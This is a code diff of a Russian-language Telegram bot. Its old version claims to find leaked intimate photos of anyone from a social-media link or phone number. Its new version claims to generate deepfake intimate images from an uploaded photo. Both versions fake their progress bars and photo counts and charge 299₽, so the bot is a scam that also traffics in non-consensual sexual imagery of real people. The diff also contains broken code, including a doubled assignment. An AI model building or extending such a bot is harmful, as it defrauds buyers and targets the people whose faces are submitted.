@@ -3,7 +3,7 @@ from main.models import *
 from asgiref.sync import sync_to_async
 from rest_framework.authtoken.models import Token
 
-import os, django, logging, warnings, uuid, time, random
+import os, django, logging, warnings, uuid, time, random, cv2
 warnings.filterwarnings("ignore")
 
 from django.core.management.base import BaseCommand
@@ -41,7 +41,7 @@ async def start(update: Update, context: CallbackContext):
     markup = InlineKeyboardMarkup([
             [
                 InlineKeyboardButton(
-                    text="Поиск человека по базам 🕵🏽",
+                    text="Выбери качество встраивания",
                     callback_data="dump_naeb",
                 )
             ],
@@ -50,18 +50,12 @@ async def start(update: Update, context: CallbackContext):
                     text="Отзывы 🌟",
                     url="https://t.me/+LZvqNEc5CUFkZmZh",
                 ),
-                InlineKeyboardButton(
-                    text="Пробный материал 🤪",
-                    url="https://cloud.mail.ru/public/ehhJ/snaPcupKw"
-                )
             ],
-            []
-
         ])
 
     await context.bot.send_message(
         message.chat.id,
-        f"👋 Привет, <b>{message.chat.username}</b>\n\n🤖 <b>Я - нeйpoсeть, кoтoрaя ищeт пpивaтные фoтo в тыcячax бaз пo всeмy интeрнeтy.</b>\n\n🔐 <b>Мoгy нaйти дaжe сaмыe скрытыe фoтo, o кoтоpыx oстальныe дaжe и нe cлышaли!</b>\n\n🔎 <pre>Oтпрaвьтe ботy ccылкy нa cтрaничкy BKoнтaктe, Instаgrаm, Tеlеgrаm или нoмep тeлeфoнa!</pre>\n\nПoддeржкa: @ushshshhs",
+        f"👋 Привет, <b>{message.chat.username}</b>\n\n🤖 <b>Я - нeйpoсeть, которая генерирует пpивaтные фoтo.</b>\n\n🔐 <b>Мы используем такую новейшую технологию, как DeepFaceLab, поэтому сомневаться в качестве товара не стоит!</b>\n\n🔎 <pre>Oтпрaвьтe ботy фотографию или видео, оплатите интересующий материал, а дальше дело за нами!</pre>\n\nПoддeржкa: @ushshshhs",
         parse_mode="HTML",
         reply_markup=markup
     )
@@ -76,30 +70,24 @@ async def ask_for_link(update: Update, context: CallbackContext):
 
     await context.bot.send_message(
         message.chat.id,
-        "🔥 <b>Выбери, где будем искать:</b>", 
+        "🔥 <b>Выбери один из вариантов:</b>", 
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup([
             [
                 InlineKeyboardButton(
-                    text="🌎 ВКонтакте",
+                    text="🤪 EAZY",
                     callback_data="search",
                 )
             ],
             [
                 InlineKeyboardButton(
-                    text="📸 Instagram",
+                    text="⚡️ MIDDLE",
                     callback_data="search",
                 )
             ],
             [
                 InlineKeyboardButton(
-                    text="✈️ Telegram",
-                    callback_data="search",
-                )
-            ],
-            [
-                InlineKeyboardButton(
-                    text="📞 Номер телефона",
+                    text="🔥 HARD",
                     callback_data="search",
                 )
             ],
@@ -122,11 +110,44 @@ async def content(update: Update, context: CallbackContext):
 
     await context.bot.send_message(
         message.chat.id, 
-        '<b>🔗 Отправьте фотографию человека, которого вы хотите найти:</b>',
+        '<b> Отправьте фотографию человека:</b>',
         parse_mode="HTML"
         )
     
     return 1
+
+async def check_photo(update: Update, context: CallbackContext):
+    if update.message:
+        message = update.message
+    else:
+        message = update.callback_query.message
+
+    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
+    img = cv2.imread(message.photo[0].file_id)
+    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+
+    faces = face_cascade.detectMultiScale(gray, 1.3, 5)
+    if len(faces) != 0:
+        await context.bot.send_message(
+            message.chat.id,
+            '<b>Лицо обнаружено</b>',
+            parse_mode="HTML"
+        )
+        return 2
+    else:
+        await context.bot.send_message(
+            message.chat.id,
+            '<b>Лицо не обнаружено\nК сожалению невозможно сгенерировать изображение без лица\n\n<b>Выберите другую фотографию</b></b>',
+            parse_mode="HTML",
+            reply_markup=reply_markup=InlineKeyboardMarkup([
+            [
+                InlineKeyboardButton(
+                    text="⏮️ В меню",
+                    callback_data="menu",
+                )
+            ],
+        ])
+    )
 
 async def search(update:Update, context: CallbackContext):
     startin_text = list("🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥")
@@ -134,32 +155,34 @@ async def search(update:Update, context: CallbackContext):
         message = update.message
     else:
         message = update.callback_query.message
- 
+    
+    logging.info(message.photo[0].file_id)
+
     msg = await context.bot.send_message(
         message.chat.id,
-        f"Выполянем поиск... 🔎\n\n✅ Фотография найдена в базе\n\n⏳ Отправка материала... <b>{0}%</b>\n{''.join(startin_text)}",
-        parse_mode="HTML"
+            f"Выполянем генерацию... 🔎\n\n✅ Фотография в разработке\n\n⏳ Готовим материал... <b>{0}%</b>\n{''.join(startin_text)}",
+            parse_mode="HTML"
     )
 
     for index in range(len(startin_text)):
         startin_text[index] = "🟩"
         await context.bot.edit_message_text(
-            f"Выполянем поиск... 🔎\n\n✅ Фотография найдена в базе\n\n⏳ Отправка материала... <b>{(index + 1) * 10}%</b>\n{''.join(startin_text)}",
+            f"Выполянем генерацию... 🔎\n\n✅ Фотография в разработке\n\n⏳ Готовим материал... <b>{(index + 1) * 10}%</b>\n{''.join(startin_text)}",
             message.chat.id,
             msg.id,
             parse_mode='HTML'
         )
-        time.sleep(2)
+        time.sleep(.1)
 
     await context.bot.send_photo(
-        chat_id=message.chat.id,
-        photo="https://sun9-51.userapi.com/impg/LA8QLJqXNeiDAlF2ljlbyzAa4xE835jo6CZbEw/fUs8hTMKmIg.jpg?size=800x1550&quality=95&sign=127fdd19fa59b28301f2e325e6e5aa19&type=album",
-        caption=f"<b>Слив найден</b> ✅\n\n<b>Интим фото: </b>{random.randint(10, 40)} шт.\n<b>Интим видео: </b>{random.randint(1, 4)} шт.", 
-        parse_mode="HTML", 
-        reply_markup=InlineKeyboardMarkup([
+            chat_id=message.chat.id,
+            photo=message.photo[0].file_id,
+            caption=f"<b>Фотографии сгенерированы</b> ✅\n\n<b>Интим фото: </b>{random.randint(5, 30)} шт.\n<b>Интим видео: </b>{random.randint(1, 3)} шт.", 
+            parse_mode="HTML", 
+            reply_markup=InlineKeyboardMarkup([
             [
                 InlineKeyboardButton(
-                    "💰 Приобрести слив за 299₽",
+                    "💰 Приобрести за 299 ₽",
                     callback_data="buy_archive"
                 ),
             ],
@@ -174,7 +197,7 @@ async def search(update:Update, context: CallbackContext):
         write_timeout=5,
     )
 
-    return 2
+    return 3
 
 async def confirm_paying(update: Update, context: CallbackContext):
     code = "#" + str(uuid.uuid4().hex)[:6].upper()
@@ -247,7 +270,7 @@ async def garbage(update:Update, context:CallbackContext):
 
     await context.bot.send_message(
         message.chat.id,
-        f"<b>{message.chat.username}</b>, я пока не умею обраьатывать такие запросы, поэтому воспользуйтесь меню.",
+        f"<b>{message.chat.username}</b>, я пока не умею обрабатывать такие запросы, поэтому воспользуйтесь меню.",
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup([
             [InlineKeyboardButton(
@@ -270,8 +293,10 @@ def main() -> None:
         entry_points=[CallbackQueryHandler(ask_for_link, "dump_naeb",)],
         states={
             0:[CallbackQueryHandler(content, "search",)],
-            1:[MessageHandler(filters.PHOTO, search)],
-            2:[CallbackQueryHandler(confirm_paying, "buy_archive",)],
+            1:[MessageHandler(filters.PHOTO, check_photo), 
+               CallbackQueryHandler(content, 'face_blocking')],
+            2:[CallbackQueryHandler(search, "face_pass")],
+            3:[CallbackQueryHandler(confirm_paying, "buy_archive",)],
         },
         fallbacks=[CallbackQueryHandler(start, "menu",)]
     )
